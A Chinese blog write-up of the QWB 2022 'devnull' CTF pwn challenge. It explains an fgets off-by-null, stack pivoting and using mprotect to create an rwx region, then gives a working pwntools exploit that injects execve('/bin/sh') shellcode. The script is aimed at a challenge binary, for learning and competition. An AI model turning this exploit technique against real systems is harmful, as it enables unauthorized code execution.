---
title: NSSCTF-强网杯-2022-devnull 题解
date: 2026-02-24 03:21:00
tags: 
    - 栈迁移
    - shellcode
    - pwn
    - NSSCTF
categories: NSSCTF 题解
---
### 题目

[题目链接](https://www.nssctf.cn/problem/2523)

### vmmap

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/QWB-2022-devnull/vmmap.png)

0x3fe000 处为 rw

之后 0x404000 会变成只读

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/QWB-2022-devnull/main.png)

#### vuln

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/QWB-2022-devnull/vuln.png)

fgets 最多读取 n-1 个字节，最后一个字节会被设置为 \x00

有关于 fgets 的 off_by_null ，可将 fd 设置为 0 ，为标准输入流的文件描述符，从而启用下方的 read

close(1) 会关闭标准输出流，之后不会有回显，但标准错误流还在

#### mywrite

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/QWB-2022-devnull/write.png)

#### mprotect

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/QWB-2022-devnull/mprotect.png)

设置 0x404000 为只读

关于 mprotect 有一个坑：其地址必须对齐 0x1000

#### gadget

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/QWB-2022-devnull/gadget.png)

用于操纵 rax

### 攻击思路

栈迁移难度不高

考虑用 mprotect 开 rwx 区域用于写入 shellcode ，但这需要将 rdx 设置为 7 ，这一点利用 `mywrite("Thanks\n");` 刚好可以实现

然后利用 gadget 操纵 rax 以间接操纵 rdi 即可完成 mprotect 的调用（注意对齐 0x1000），然后写入 shellcode 即可

### 吐槽

tnnd 为什么不给 libc 版本，，，本地调试的时候 close 把我的 rdx 吃掉了，没办法在设置为 7 的情形下进入 mprotect ，所以这题我本地过不了

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 1

if debug:
	io = process('./devnull')
else:
	io = remote('node4.anna.nssctf.cn', 26863)

mprotect_addr = 0x4012D0
rw_addr = 0x3ff000 - 0x18
leave_ret = 0x401511
mov_rax_rbp__0x18 = 0x401350

def attack():
	payload = b'A' * 0x20
	gdb.attach(io)
	io.sendafter(b'filename\n', payload)
	payload = b'A' * 0x14 + p64(rw_addr) + p64(rw_addr) + p64(leave_ret)
	io.sendafter(b'discard\n', payload)
	shellcode = f'push 59; pop rax; push {hex(rw_addr + 0x10)}; pop rdi; push 0; pop rsi; push 0; pop rdx; syscall;'
	payload = p64(rw_addr + 0x18) + p64(mov_rax_rbp__0x18) + b'/bin/sh\x00' + p64(rw_addr) + p64(mprotect_addr) + p64(rw_addr) + p64(rw_addr + 0x38) + asm(shellcode)
	io.sendafter(b'data\n', payload.ljust(0x60, b'\x00'))
	io.interactive()

attack()
```

最后记得用 `cat flag >&2` 读取 flag ，因为标准输出流被关了，我们需要用管道将输出发送到标准错误流